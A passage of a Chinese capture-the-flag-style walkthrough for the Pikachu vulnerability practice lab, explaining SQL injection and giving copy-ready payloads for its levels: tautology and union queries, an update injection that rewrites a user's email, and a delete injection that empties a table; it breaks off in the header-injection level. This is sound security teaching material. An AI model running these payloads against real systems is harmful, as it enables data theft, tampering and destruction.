---
title: 2026最新 Pikachu 漏洞练习平台通关教程
url: https://mp.weixin.qq.com/s/B6O6at49gQkZuOwk6hLw0A
source: Doonsec's feed
date: 2026-10-30
fetch_date: 2026-10-31T07:42:48.789253
---

# 2026最新 Pikachu 漏洞练习平台通关教程

# 2026最新 Pikachu 漏洞练习平台通关教程

原创

小智
小智

智榜样网络安全学习中心

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

> 靶场入口：https://src.zhibangyang.cn
> 在该页面点「启动靶场」后访问分配到的地址；实例每次启动端口不同。

本文覆盖 Pikachu 全部 44 个关卡，按模块分组。每关给入口、闭合方式/绕过点、可直接复制的 payload，以及真机复现的截图。

## 目录

* 一、靶场概述
* 二、SQL 注入（10 关）
* 三、XSS（10 关）
* 四、暴力破解与 CSRF（7 关）
* 五、命令执行与文件类（7 关）
* 六、越权与杂项（9 关）
* 七、风险汇总
* 八、修复优先级

## 一、靶场概述

### 基本信息

| 项 | 内容 |
| --- | --- |
| 靶场名称 | Pikachu 漏洞练习平台 |
| 访问入口 | https://src.zhibangyang.cn/（点「启动靶场」后按分配端口访问） |
| 技术栈 | PHP + Apache + MySQL |
| 测试时间 | 2026-10-24 |
| 测试范围 | 全部 44 个关卡：SQL 注入 / XSS / 暴力破解 / CSRF / RCE / 文件包含 / 文件上传 / 文件下载 / 越权 / 目录遍历 / 信息泄露 / 反序列化 / XXE / URL 跳转 / SSRF |
| 重点漏洞 | 6 处（严重 2 / 高危 3 / 中危 1），详见第七节 |

### 环境

Pikachu 按漏洞类型分模块组织，每个模块是一个独立的 PHP 页面，页面左侧为模块导航。

![Pikachu 首页](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibzm8nWOdauMkJSJLd6HatPHInPjVqHEoFCibIOOTOcXN52IzdBOa2IMhQ1sIAJgJrCbtJEicnSV3jDtD5jyBbHbWVbdnpXCmJReqpgM0lJ2g4/640?wx_fmt=webp&from=appmsg)

*图 1：靶场首页，左侧导航列出全部漏洞模块*

全部关卡按 15 个模块组织，模块分布见下表；每关的复现步骤在第二至六节。

### 重点漏洞与等级

| 编号 | 漏洞类型 | 位置 | 等级 |
| --- | --- | --- | --- |
| 1 | SQL 注入（字符型） | `/vul/sqli/sqli_str.php` | 高危 |
| 2 | 反射型 XSS | `/vul/xss/xss_reflected_get.php` | 中危 |
| 3 | 存储型 XSS | `/vul/xss/xss_stored.php` | 高危 |
| 4 | 本地文件包含 | `/vul/fileinclude/fi_local.php` | 高危 |
| 5 | 文件上传（客户端校验绕过） | `/vul/unsafeupload/clientcheck.php` | 严重 |
| 6 | 命令执行 | `/vul/rce/rce_ping.php` | 严重 |

---

### 模块分布

| 模块 | 关卡数 | 入口前缀 |
| --- | --- | --- |
| SQL 注入 | 10 | `vul/sqli/` |
| XSS | 10 | `vul/xss/` |
| 暴力破解 | 4 | `vul/burteforce/` |
| CSRF | 3 | `vul/csrf/` |
| RCE | 2 | `vul/rce/` |
| 文件包含 | 2 | `vul/fileinclude/` |
| 文件下载 | 1 | `vul/unsafedownload/` |
| 文件上传 | 3 | `vul/unsafeupload/` |
| 越权 | 2 | `vul/overpermission/` |
| 目录遍历 | 1 | `vul/dir/` |
| 信息泄露 | 1 | `vul/infoleak/` |
| PHP 反序列化 | 1 | `vul/unserilization/` |
| XXE | 1 | `vul/xxe/` |
| URL 跳转 | 1 | `vul/urlredirect/` |
| SSRF | 2 | `vul/ssrf/` |

合计 **44 个关卡**，下面按模块逐关过。

### 测试账号

绝大多数关卡不用登录，直接访问就能打。练"登录框"的那几关统一用下面的账号：

| 账号 | 密码 | 用在哪 |
| --- | --- | --- |
| `admin` | `123456` | 暴力破解 4 关、http header 注入 |
| `kobe` | `123456` | SQL 注入 update 关、水平越权（自测） |
| `lucy` | `123456` | 水平越权（拿它去越权别人的数据） |
| `lili` | `123456` | 水平越权的目标账号 |

具体某一关用哪个，正文里在该关开头都标了「**账号**：xxx」。

## 二、SQL 注入（10 关）

### 原理：SQL 注入到底是怎么发生的

先看这关的后端代码（`vul/sqli/sqli_str.php` 的核心逻辑，其他关大同小异）：

```
php$name = $_GET['name'];                                        // 用户输入，想传什么就传什么
$query = "select id,email from member where username='$name'";  // 直接拼进 SQL
$result = mysqli_query($link, $query);
```

数据库里 `member` 表长这样（3 列，但查询只取了 id、email 两列）：

| id | username | email |
| --- | --- | --- |
| 1 | kobe | kobe@pikachu.com |
| 2 | lucy | lucy@pikachu.com |
| ... | ... | ... |

**正常情况**：传 `name=kobe`，拼出来是

```
sqlselect id,email from member where username='kobe'
```

数据库理解为"找 username 等于 kobe 的那个人"，返回 1 行。这里 `kobe` 是**数据**，被单引号包着，数据库不会把它当命令。

**注入情况**：传 `name=kobe' or 1=1 #`，拼出来变成

```
sqlselect id,email from member where username='kobe' or 1=1 #'
```

对比一下，多出来的 `' or 1=1 #` 跑到单引号外面去了，成了**语法**：

| 片段 | 干了什么 |
| --- | --- |
| `kobe` | 原来要查的用户名 |
| `'` | **闭合** 前面的单引号，让后面的内容是"引号外" |
| `or 1=1` | 加一个永远成立的条件 |
| `#` | 注释掉原 SQL 剩下那个 `'`，否则引号不配对会报错 |

**为什么 `or 1=1` 能返回全部数据**：`WHERE A or B` 只要有一个成立就返回该行。`1=1` 恒真 → 每一行都成立 → 全表返回。

**为什么报错信息里能看到 `'"kobe"'`**：因为 PHP 把 `$name` 拼进去之后就是 `username='"kobe"'` 这个字符串，数据库报语法错时会把附近的原文回显出来——这也是判断"参数有没有被过滤"最直接的办法。

**为什么要先判断列数**：`union` 的两条查询列数必须一样。这关查的是 `id,email`**两列**，所以 union 后面也只能跟两个值：

```
sqlkobe' union select 1,database() #
```

第一个位置 `1` 是占位符（页面显示成 id），第二个位置放 `database()`，页面就在 email 那一栏显示库名 `pikachu`。

> 记住这条主线：**找注入点 → 判断闭合 → 判断列数 → 有回显用 union / 有报错用报错注入 / 都没有用盲注**。下面 10 关都是这个流程的变体。

SQL-Inject 模块下共 10 个关卡，注入点分布在 GET、POST、Cookie/Header 和 update/insert 语句里。本篇按"找注入点 → 闭合 → 出数据"的顺序逐关过一遍，每关给可直接复制的 payload。

### 关卡清单

| # | 关卡 | 入口 | 闭合方式 |
| --- | --- | --- | --- |
| 1 | 字符型注入(get) | `sqli_str.php` | `'` |
| 2 | 数字型注入(post) | `sqli_id.php` | 无需闭合 |
| 3 | 搜索型注入 | `sqli_search.php` | `%'` |
| 4 | xx 型注入 | `sqli_x.php` | `')` |
| 5 | insert/update 注入 | `sqli_iu/` | `'` |
| 6 | delete 注入 | `sqli_del.php` | 无需闭合 |
| 7 | http header 注入 | `sqli_header/` | `'` |
| 8 | 盲注(boolean) | `sqli_blind_b.php` | `'` |
| 9 | 盲注(time) | `sqli_blind_t.php` | `'` |
| 10 | 宽字节注入 | `sqli_widebyte.php` | `%df'` |

---

### 2.1 字符型注入（get）

**入口**：`/vul/sqli/sqli_str.php`**参数**：`name`（GET）　**闭合**：单引号

先扔一个单引号探路，页面把数据库错误直接吐出来了，报错里能看到拼进去的 `'"kobe"'`，说明参数是原样拼接：

![报错](https://mmbiz.qpic.cn/mmbiz_jpg/ibzm8nWOdauN22eZWLUicRdJiacBYFH2h1HMnwEdMRssWaTAgNMnialicIlcpSlYBsPpCguAAw51DczH7yoBTdGbdZmrtIBcHYkPkI0FYEtruewo/640?wx_fmt=webp&from=appmsg)

*图 1：`kobe'` 触发 `You have an error in your SQL syntax ... near '"kobe"'`*

闭合方式确认后，用 `#` 注释掉后面的引号，加恒真条件：

```
sqlkobe' or 1=1 #
```

![or 1=1](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibzm8nWOdauNciavrxiajLxcywGj0OQy14e0BrU7Bia9bicOVzMouGLZIKaTCBZDeky78R0n25JIg7abqHiceCiaSvPsibcY8kMtxicicTZtFAlhVxYNE/640?wx_fmt=webp&from=appmsg)

*图 2：全部 7 条用户记录被返回*

读库名用 union。member 表查询两列（id、email），所以 union 后面也补两列：

```
sqlkobe' union select 1,database() #
```

![union](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibzm8nWOdauM5OLBo4MWXYm0S7L1ghIK36k7iajD6DB5vIJFhJWwvOTJQ6zzvg0MYHNiaMvGakhiaK3ANtvaWZicxZSfEJyRs40iaibmFeerMaQ2hk/640?wx_fmt=webp&from=appmsg)

*图 3：数据库名 `pikachu` 回显在 email 位置*

### 2.2 数字型注入（post）

**入口**：`/vul/sqli/sqli_id.php`**参数**：`id`（POST，下拉框）　**闭合**：不需要

页面是下拉框选 uid，下拉框本身没法输入 payload。把选项改成 payload 再提交：

```
javascript// 浏览器控制台执行，给下拉框塞一个自定义 option
const s = document.querySelector("select[name='id']");
const o = document.createElement('option');
o.value = "1 or 1=1"; o.textContent = "1 or 1=1"; o.selected = true;
s.appendChild(o);
```

数字型不需要闭合引号，直接接条件：

```
sql1 or 1=1
```

![数字型](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibzm8nWOdauP8KcHVlvB8JxlLURvPvKeXJJUFicAwejbZ0tnV6sN1ONgxQ22IVxInibia6hkCLwft6WYYmvn7mjcLJCLia8wkYNTdcnDriaU9ygag/640?wx_fmt=webp&from=appmsg)

*图 4：下拉框被替换成 `1 or 1=1`，返回全部 7 个用户*

### 2.3 搜索型注入

**入口**：`/vul/sqli/sqli_search.php`**参数**：`name`（GET）　**闭合**：`%'`

搜索功能拼的是 `like '%$name%'`，闭合时要连 `%` 一起处理：

```
sqlkobe%' or 1=1 #
```

![搜索型](https://mmbiz.qpic.cn/mmbiz_jpg/ibzm8nWOdauP39V3dkDy5o2PvY8jjvUqGXKdyRNtVAveSEYDB3p8icDcBhux09kdoyeYVib54pF4whLGmf5TDq7jAldmmrGNINI4YVibFDg1V8Q/640?wx_fmt=webp&from=appmsg)

*图 5：绕过 like 的通配符，返回全表*

### 2.4 xx 型注入

**入口**：`/vul/sqli/sqli_x.php`**参数**：`name`（GET）　**闭合**：`')`

这条语句多套了一层括号，闭合要补上右括号：

```
sqlkobe') or 1=1 #
```

![xx型](https://mmbiz.qpic.cn/mmbiz_jpg/ibzm8nWOdauNib1ibEALkT7xJSCrV9cxNMLG4MIlN40mK5LTAPn2aavhORNNico21aMTT5LNKGblziaQhBBEQqx8X6ljGlrvibh8frDTeG5OD3EQc/640?wx_fmt=webp&from=appmsg)

*图 6：括号闭合后被注释掉，条件生效*

### 2.5 insert/update 注入

**入口**：`/vul/sqli/sqli_iu/`**账号**：`kobe/123456`**闭合**：`'`

先用 kobe 登录，进会员中心点"修改个人信息"。四个字段（性别、手机、住址、邮箱）都没有转义，随便挑一个塞 payload。

住址字段填：

```
sqlx' , email='injected@pikachu.com' where username='kobe' #
```

拼进 SQL 后变成 `update member set ..., address='x' , email='injected@pikachu.com' where username='kobe' #', email='...'`，把 kobe 的邮箱改掉了。

![update注入](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibzm8nWOdauOQo6oIIbncF96B8hnD2wRTAYyRiaVokTYa9B8wkUYEic1eqmm91ibMyZ75udEa5iacXdxNxPSsMWc9cBFUYT0JthEuBiciaKqzkiaxGI/640?wx_fmt=webp&from=appmsg)

*图 7：提交后返回会员中心，数据已被改写（kobe 的邮箱变成 injected@pikachu.com，可在第 10 关的查询结果里看到）*

> update 型注入的价值不在拖库，而在于**改数据**——改管理员密码、改余额、改权限，比读数据更隐蔽。

### 2.6 delete 注入

**入口**：`/vul/sqli/sqli_del.php`**参数**：`id`（GET）　**闭合**：不需要

留言列表的删除链接是 `?id=x&submit=submit`，id 直接拼进 `delete from message where id=$id`。直接手改 URL：

```
text/vul/sqli/sqli_del.php?id=1 or 1=1&submit=submit
```

![delete注入](https://mmbiz.qpic.cn/mmbiz_jpg/ibzm8nWOdauNxqrjJVH6qAtOnW72pswatE5ZPI7wR6cMCmalxw9FbQP8TTFjcWuG3kt0Up56dQ9VvSjSxvbPOrOFhX3ejbqR4IJGDCdx6quY/640?wx_fmt=webp&from=appmsg)

*图 8：条件恒真，整个留言表被清空（列表变空）*

> 这条语句一旦被利用，后果是**整表删除**。生产环境里 `delete` 注入比 `select` 注入危险得多。

### 2.7 http header 注入

**入口**：`/vul/sqli/sqli_header/`**账号**：`admin/123456`**注入点**：`User-Agent`

登录后页面会把 IP、UA、Accept 等信息 `insert` 进 httpinfo 表。UA 没有转义，可以把注入语句塞进请求头。

用 Burp 或浏览器插件改 UA 为：

```
textx...